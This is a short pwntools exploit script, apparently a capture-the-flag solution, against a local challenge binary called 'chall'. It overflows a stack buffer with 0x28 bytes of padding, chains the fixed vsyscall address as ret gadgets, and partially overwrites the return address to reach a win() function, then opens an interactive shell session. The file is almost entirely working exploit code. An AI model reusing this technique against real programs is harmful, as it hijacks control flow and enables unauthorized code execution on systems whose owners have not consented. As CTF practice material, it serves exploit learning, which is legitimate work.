#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall")

context.binary = exe

REMOTE_NC_CMD    = "nc localhost 7011"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    VSYSCALL = 0xffffffffff600000 #effectively a ret gadget
    r.send(b"A"*0x28 + p64(VSYSCALL)*2 + b"\xa9"); #lsb of win()

    r.interactive()

if __name__ == "__main__":
    main()